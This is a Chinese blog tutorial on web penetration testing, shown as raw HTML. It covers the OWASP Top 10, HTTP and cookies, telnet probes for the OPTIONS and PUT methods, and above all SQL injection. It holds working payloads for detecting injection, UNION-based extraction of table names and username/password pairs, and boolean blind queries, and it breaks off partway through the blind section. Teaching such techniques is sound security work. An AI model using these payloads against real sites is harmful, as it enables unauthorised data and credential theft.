<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Web渗透 | Magialeaf的小窝</title><meta name="author" content="Maigaleaf"><meta name="copyright" content="Maigaleaf"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Web渗透概述">
<meta property="og:type" content="article">
<meta property="og:title" content="Web渗透">
<meta property="og:url" content="http://magialeaf.github.io/posts/54924480.html">
<meta property="og:site_name" content="Magialeaf的小窝">
<meta property="og:description" content="Web渗透概述">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://magialeaf.github.io/img/default_cover_10.png">
<meta property="article:published_time" content="2023-05-21T04:00:00.000Z">
<meta property="article:modified_time" content="2023-10-11T09:06:46.210Z">
<meta property="article:author" content="Maigaleaf">
<meta property="article:tag" content="概述">
<meta property="article:tag" content="Web安全">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://magialeaf.github.io/img/default_cover_10.png"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="http://magialeaf.github.io/posts/54924480.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"距离上次更新已经过去","messageNext":"天了，文章内容可能已经过期！"},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Maigaleaf","link":"链接: ","source":"来源: Magialeaf的小窝","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Web渗透',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-10-11 17:06:46'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn1.tianli0.top/npm/element-ui@2.15.6/packages/theme-chalk/lib/index.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/readPercent.css"><link rel="stylesheet" href="/css/announcement.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
<link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">45</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-bookmark"></i><span> 作品</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/works/"><i class="fa-fw fa-sharp fa-solid fa-star"></i><span> 作品集</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-comment"></i><span> 社区</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/default_cover_10.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Magialeaf的小窝"><span class="site-name">Magialeaf的小窝</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><!-- span=' '+_p('search.title')--></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-bookmark"></i><span> 作品</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/works/"><i class="fa-fw fa-sharp fa-solid fa-star"></i><span> 作品集</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-comment"></i><span> 社区</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Web渗透</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-21T04:00:00.000Z" title="发表于 2023-05-21 12:00:00">2023-05-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-11T09:06:46.210Z" title="更新于 2023-10-11 17:06:46">2023-10-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>43分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Web渗透"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h1><blockquote>
<p><a href=".\5cfe0bd9">text::Web渗透工具</a></p>
</blockquote>
<hr>
<h2 id="〇、Web安全基础"><a href="#〇、Web安全基础" class="headerlink" title="〇、Web安全基础"></a>〇、Web安全基础</h2><h3 id="1-OWAPS"><a href="#1-OWAPS" class="headerlink" title="1 OWAPS"></a>1 OWAPS</h3><blockquote>
<p>OWAPS（Open Web Application Security Project，开放式Web应用程序安全项目）：提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。</p>
<p><a target="_blank" rel="noopener" href="http://www.owasp.org.cn/">official::OWAPS官网</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/393635352">Top10</a></p>
</blockquote>
<ul>
<li>漏洞类型（2017年 Top10）<ol>
<li>注入：数据作为命令注入。</li>
<li>失效的身份认证：冒充身份。</li>
<li>敏感感数据泄露：数据泄露。</li>
<li>XML外部实体（XXE）：全称为XML External Entity attack 即XML(可扩展标记语言) 外部实体注入攻击。</li>
<li>失效的访问控制：未身份认证但获得了权限。</li>
<li>安全配置错误：不安全的配置。</li>
<li>跨站脚本（XSS）：脚本转义。</li>
<li>不安全的反序列化：反序列化。</li>
<li>使用含有已经漏洞的组件：漏洞利用。</li>
<li>不足的日志记录和监控：日志缺陷。</li>
</ol>
</li>
</ul>
<h3 id="2-http协议"><a href="#2-http协议" class="headerlink" title="2 http协议"></a>2 http协议</h3><ul>
<li><p>http协议主要用于传输 html 文本</p>
<blockquote>
<p>URL（统一资源定位符）是一种特殊的URI（统一资源标识符）。</p>
</blockquote>
</li>
<li><p>请求头</p>
<ul>
<li><p>Host</p>
</li>
<li><p>User-Agent</p>
</li>
<li><p>Accept</p>
</li>
<li><p>Accept-Language</p>
</li>
<li><p>Cookie</p>
<blockquote>
<p>一般，一个浏览器最多300个Cookie，每个domain最多20个Cookie，每个Cookie大小都小于4KB。</p>
</blockquote>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">// 设置Cookie</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</span><br><span class="line"></span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Strict</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=Lax</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; SameSite=None; Secure</span><br><span class="line"></span><br><span class="line">// 设置多种属性的案例：</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>&lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<ul>
<li>Referer </li>
</ul>
<ul>
<li><p>响应头</p>
<ul>
<li>Location：控制浏览器重定向到哪个页面。</li>
<li>Server：服务器的 banner 信息。</li>
<li>Set-Cookie：服务器发送给客户端的 Cookie 设置信息。</li>
<li>Cache-Control：服务器控制浏览器是否要缓存网页。</li>
</ul>
</li>
<li><p>测试服务器开放的方法：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">telnet IP</span><br><span class="line"><span class="keyword">OPTIONS</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:IP</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试PUT漏洞</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">telnet IP</span><br><span class="line"><span class="keyword">PUT</span> <span class="string">/input.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">HOST:IP</span><br><span class="line">Content-Length=6</span><br><span class="line"></span><br><span class="line">123456</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-Cookie与Session详解"><a href="#3-Cookie与Session详解" class="headerlink" title="3 Cookie与Session详解"></a>3 Cookie与Session详解</h3><ul>
<li><p>设置 Cookie</p>
<p><code>&lt;?php setcookie(&quot;user&quot; , &quot;value&quot; , time() + &lt;time&gt; )&gt;</code></p>
</li>
<li><p>获取 Cookie</p>
<p><code>&lt;?php print_r( $_COOKIE[ &quot;user&quot; ])</code></p>
</li>
<li><p>删除 Cookie</p>
<p><code>&lt;?php setcookie(&quot;user&quot; , &quot;value&quot; , time() - &lt;time&gt; )&gt;</code></p>
</li>
<li><p>Cookie解密</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/Magialeaf/Web/blob/main/Attack/Cookie解密.py">源码</a></p>
</blockquote>
</li>
<li><p>Session</p>
<blockquote>
<p>session信息存储在服务器端的数据库或者文件中。客户端请求服务器时都会带上Session信息，这样服务器就可以区分不同的客户端请求。</p>
<p>组成：Session id，Session file，Session data。</p>
</blockquote>
</li>
</ul>
<h3 id="4-其他相关知识"><a href="#4-其他相关知识" class="headerlink" title="4 其他相关知识"></a>4 其他相关知识</h3><ul>
<li><a href=".\Web渗透工具.md">Web渗透工具</a> </li>
<li><a href="..\..\Main\OS_Security\Kali Linux.md">Kali Linux</a> </li>
<li><a href="..\Web_Backend\PHP.md">PHP</a> </li>
</ul>
<hr>
<h2 id="一、SQL注入"><a href="#一、SQL注入" class="headerlink" title="一、SQL注入"></a>一、SQL注入</h2><h3 id="1-注入类型"><a href="#1-注入类型" class="headerlink" title="1 注入类型"></a>1 注入类型</h3><ul>
<li><p>数字型注入（通过返回结果判断）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 测试流程</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; # 不正常返回</span></span><br><span class="line"><span class="string">id=1 and 1=1; # 正常返回</span></span><br><span class="line"><span class="string">id=1 and 1=2; # 不正常返回</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>字符型注入（通过返回结果判断）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 测试流程</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; # 不正常返回</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1; # 正常返回</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2; # 不正常返回</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=1 or 1=1; # 表中所有数据将会被显示</span></span><br><span class="line"><span class="string">1&#x27;</span>#; # 会截断后面的 <span class="keyword">sql</span> 语句</span><br></pre></td></tr></table></figure>
</li>
<li><p>搜索型注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 原理：<span class="keyword">sql</span>语句中存在 变量 <span class="keyword">like</span> <span class="string">&#x27;%xx%&#x27;</span></span><br><span class="line"></span><br><span class="line"># 测试流程，任一不报错表示存在搜索型注入</span><br><span class="line"><span class="string">&#x27;and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"><span class="operator">%</span><span class="string">&#x27; and 1=1--&#x27;</span>;</span><br><span class="line"><span class="operator">%</span><span class="string">&#x27; and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>xx型注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 原理：<span class="keyword">sql</span>语句中存在 变量<span class="operator">=</span>(<span class="string">&#x27;xx&#x27;</span>) </span><br><span class="line"></span><br><span class="line"># 测试流程，不报错表示存在xx型注入</span><br><span class="line">x<span class="string">&#x27;) or 1=1 #;  </span></span><br></pre></td></tr></table></figure>
</li>
<li><p>报错注入：有报错返回的注入</p>
</li>
<li><p>盲注：无报错返回的注入</p>
</li>
</ul>
<h3 id="2-MySQL数据库"><a href="#2-MySQL数据库" class="headerlink" title="2 MySQL数据库"></a>2 MySQL数据库</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ajdidfj/article/details/123246593">部分函数</a></p>
</blockquote>
<h4 id="2-1-简单使用"><a href="#2-1-简单使用" class="headerlink" title="2.1 简单使用"></a>2.1 简单使用</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MYSQL——bin</span></span><br><span class="line">mysql -u &lt;user&gt; -p：登入</span><br><span class="line">登入后输入的命令要有 ; </span><br><span class="line"></span><br><span class="line"><span class="comment"># 尾部加：%23（#），（--+）截断后面的命令</span></span><br></pre></td></tr></table></figure>
<h4 id="2-2-联合注入"><a href="#2-2-联合注入" class="headerlink" title="2.2 联合注入"></a>2.2 联合注入</h4><ul>
<li><p>系统表</p>
<blockquote>
<p>MySQL自带 information_schema 数据库，他提供了访问数据库元数据的方式。（元数据是数据的数据，如数据库名或表名、列的数据类型或访问权限等）    </p>
</blockquote>
<ul>
<li><p>SCHEMATA表</p>
<blockquote>
<p>提供了当前 MySQL 实例中所有数据库的信息。（show database结果取自此表）</p>
<p>information_schema.CHEMATA可查：schema_name</p>
</blockquote>
</li>
<li><p>TABLES表</p>
<blockquote>
<p>提供了关于数据库中表（视图）的信息（表属于那个 schema、表类型、表引擎、创建时间等）。（show tables from “schema_name”）</p>
<p>information_schema.tables可查：table_schema，table_name</p>
</blockquote>
</li>
<li><p>COLUMNS表</p>
<blockquote>
<p>提供了表中的列信息（某个表的所有列以及每个列的信息）。（show columns from “schema_name.table_name”）</p>
<p>information_schema.columns可查：table_schema，table_name，column_name</p>
</blockquote>
</li>
</ul>
</li>
<li><p>union联合注入</p>
<blockquote>
<p>union ：联合注入（两个select结果格式应一致，union查询出多条会只保留一条）</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、判断注入点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line"># 数字型还是字符型</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、判断列数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line"># 表示依照第一列排序，依此可以判断有多少列</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、判断报错点</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"># 获得报错列，将<span class="keyword">sql</span>语句放到报错列上</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、获取当前数据库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,CONCAT_WS(<span class="type">CHAR</span>(<span class="number">32</span>,<span class="number">58</span>,<span class="number">32</span>),<span class="keyword">user</span>(),database(),version()),<span class="number">3</span></span><br><span class="line"># <span class="keyword">user</span>()：当前用户名，database()：当前数据库名，version()：当前版本，concat_ws()：指定分隔符拼接（参数一是分隔符）</span><br><span class="line"></span><br><span class="line"># <span class="number">5</span>、获取数据库中表名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span></span><br><span class="line"># group_concat( [<span class="keyword">distinct</span>] 要连接的字段 [<span class="keyword">order</span> <span class="keyword">by</span> 排序字段 <span class="keyword">asc</span><span class="operator">/</span><span class="keyword">desc</span> ] [separator <span class="string">&#x27;分隔符&#x27;</span>] )</span><br><span class="line"></span><br><span class="line"># <span class="number">6</span>、获取表中列名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;name&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span></span><br><span class="line"># 同理</span><br><span class="line"></span><br><span class="line"># <span class="number">7</span>、获取列中数据</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27; &#x27;</span>,password),<span class="number">3</span> <span class="keyword">from</span> <span class="keyword">user</span></span><br><span class="line"># 同理</span><br></pre></td></tr></table></figure>
</li>
<li><p>常用函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 从n开始，输出m个结果</span><br><span class="line">limit n,m</span><br><span class="line"><span class="keyword">user</span>()</span><br><span class="line"><span class="built_in">current_user</span>()</span><br><span class="line">database()</span><br><span class="line">version()</span><br><span class="line">length()</span><br><span class="line">hex()</span><br><span class="line"></span><br><span class="line"># 数据库路径</span><br><span class="line">@<span class="variable">@datadir</span></span><br><span class="line"># 数据库系统版本</span><br><span class="line">@<span class="variable">@version_compile_os</span></span><br><span class="line"># 写文件</span><br><span class="line">into_dumpfile()</span><br><span class="line"># 读文件</span><br><span class="line">load_file()</span><br><span class="line"># 拼接字符串</span><br><span class="line">concat(str,str)</span><br><span class="line"># 将<span class="keyword">group</span> <span class="keyword">by</span>产生的同一个分组中的值连接起来，返回一个字符串结果，用法如上。</span><br><span class="line">group_concat()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-3-布尔盲注"><a href="#2-3-布尔盲注" class="headerlink" title="2.3 布尔盲注"></a>2.3 布尔盲注</h4><ul>
<li><p>布尔盲注</p>
<blockquote>
<p>依照返回结果是 true 或 false 来进行注入。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># <span class="number">1</span>、数据库长度</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> length(database())) <span class="operator">&gt;</span> num</span><br><span class="line"># 修改num值和大于符号，试出长度</span><br><span class="line"></span><br><span class="line"># <span class="number">2</span>、库名（参数<span class="number">2</span>从<span class="number">1</span>开始）</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii(<span class="built_in">substring</span>(database(),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 改substring参数二，num和符号，逐步试出库名</span><br><span class="line"></span><br><span class="line"># <span class="number">3</span>、表名</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii (<span class="built_in">substring</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27; name &#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> num</span><br><span class="line"># 改substring参数二，num和符号，逐步试出库名。limit是限制输出第一个表，如果有多个表要改第一个参数</span><br><span class="line"></span><br><span class="line"># <span class="number">4</span>、表列名</span><br><span class="line">id<span class="operator">=</span><span class="number">33</span> <span class="keyword">and</span> (<span class="keyword">select</span> ascii (<span class="built_in">substring</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span 